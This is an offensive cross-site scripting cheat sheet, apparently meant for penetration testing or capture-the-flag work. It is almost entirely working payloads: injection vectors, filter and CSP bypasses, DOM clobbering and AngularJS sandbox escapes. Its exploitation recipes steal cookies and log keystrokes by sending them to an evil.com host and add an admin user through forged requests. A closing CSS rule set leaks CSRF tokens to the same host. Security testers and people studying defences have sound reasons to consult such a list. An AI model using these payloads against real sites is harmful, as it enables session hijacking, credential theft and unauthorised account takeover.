# Cross-Site Scripting (XSS)

## Quick Payloads
```html
<script>alert(1)</script>                        <!-- basic -->
<img src=x onerror=alert(1)>                     <!-- event handler -->
<svg onload=alert(1)>                            <!-- SVG -->
<svg/onload=alert(1)>                            <!-- no space needed -->
<details open ontoggle=alert(1)>                 <!-- HTML5 -->
"><script>alert(1)</script>                      <!-- attribute breakout -->
'-alert(1)-'                                     <!-- JS string breakout -->
javascript:alert(1)                              <!-- in href/src -->
```

## Context-Specific
| Context | Payload Pattern |
|---|---|
| Inside `<tag attr="HERE">` | `" onmouseover=alert(1) x="` |
| Inside `<script>var x='HERE'` | `';alert(1)//` or `</script><script>alert(1)` |
| Inside URL attribute | `javascript:alert(1)` |
| Inside HTML comment | `--><script>alert(1)` |

## Filter Bypass
| Filter | Bypass |
|---|---|
| `<script>` blocked | `<img>`, `<svg>`, event handlers |
| `alert` blocked | `confirm(1)`, `prompt(1)`, `print()`, `top['al'+'ert'](1)` |
| `()` blocked | `` alert`1` `` (tagged template literal) |
| Case-sensitive | `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>` |
| Spaces blocked | `<svg/onload=alert(1)>` (use `/` as separator) |
| Encoding | HTML entities: `&#97;lert(1)`, `&#x61;lert(1)` |
| DOMPurify | Mutation XSS via `<math>`, `<svg>`, namespace confusion |

## CSP Bypass
| Policy | Bypass |
|---|---|
| `script-src 'self'` | Upload JS file, JSONP endpoint, Angular CDN |
| `script-src 'nonce-xxx'` | Predict/leak nonce, or inject into nonce-bearing script |
| `script-src cdn.example.com` | Find XSS-able script on the allowed CDN |
| `base-uri` missing | `<base href=attacker.com>` hijacks relative script paths |

## DOM XSS
**Sources**: `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, `postMessage`
**Sinks**: `innerHTML`, `document.write`, `eval`, `setTimeout`, `location.href`, `jQuery.html()`
```javascript
// Example: http://target/#<img src=x onerror=alert(1)>
document.getElementById('x').innerHTML = decodeURIComponent(location.hash.slice(1))
```

## DOM Clobbering
```html
<!-- If JS checks: if (window.config) { ... } -->
<a id=config href="javascript:alert(1)">  <!-- window.config now exists -->
```

## Exploitation Recipes
```javascript
// Cookie theft
fetch('https://evil.com/?c='+document.cookie)
// Admin action (CSRF via XSS)
fetch('/admin/adduser',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'user=evil&role=admin'})
// Keylogger
document.onkeypress=e=>fetch('https://evil.com/k?'+e.key)
```

## Client-Side Template Injection (CSTI)
**When**: App uses AngularJS (< 1.6), Vue.js `v-html`, or other client-side template frameworks with user input rendered in templates.

### AngularJS (< 1.6 has sandbox)
```
{{1+1}}                                          <!-- confirm CSTI -->
{{constructor.constructor('return this')()}}       <!-- sandbox escape (1.0–1.5) -->
{{$on.constructor('alert(1)')()}}                  <!-- 1.2.0–1.2.18 -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}  <!-- 1.2.19–1.2.23 -->
```
AngularJS ≥ 1.6 removed the sandbox entirely — `{{constructor.constructor('return this')().alert(1)}}` works directly.

### Vue.js
```html
<!-- v-html renders raw HTML — XSS if user-controlled -->
<div v-html="userInput"></div>
<!-- Payload: userInput = '<img src=x onerror=alert(1)>' -->
```

### Detection
If `{{7*7}}` renders as `49` in the page source (not in a server error), it's CSTI not SSTI. CSTI runs in the browser; SSTI runs on the server.

## CSS Exfiltration (no JS needed)
```css
input[name=csrf][value^=a]{background:url(https://evil.com/a)}
input[name=csrf][value^=b]{background:url(https://evil.com/b)}
/* one rule per candidate character per position */
```
